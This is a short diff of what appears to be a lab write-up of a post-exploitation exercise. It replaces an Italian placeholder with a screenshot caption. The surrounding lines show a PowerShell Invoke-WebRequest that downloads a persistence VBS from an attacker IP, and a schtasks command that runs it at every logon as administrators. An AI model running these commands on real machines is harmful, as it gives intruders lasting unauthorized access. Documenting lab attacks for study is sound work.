@@ -124,7 +124,8 @@ Invoke-WebRequest -Uri "http://10.0.2.15/Persistance.vbs" -OutFile "C:\Persistan
 
 - **Setting the Scripts to Run at Logon**: The seguent command is executed `schtasks /create /tn "Persistance" /tr "wscript.exe 'C:\Persistance.vbs'" /sc onlogon /ru "BUILTIN\Administrators" /rp ""` to set the scripts to run at every log on as administrator by creating a task named "Persistance". This ensures that the attacker retains access to the machine, even if it is rebooted.
 
-# IMMAGINE RS KALI CON COMANDI ESEGUITI E LS PER VEDERE I FILE SCARICATI
+Below is shown the results of the previous operations, on the left there are the two downloaded files in the victim machine, on the right there are the operations computed through the powershell in Kali
+![Persistance Win_Kali](images/Persistance.png)
 
 Here the code inside the file "Persistance.ps1"
 
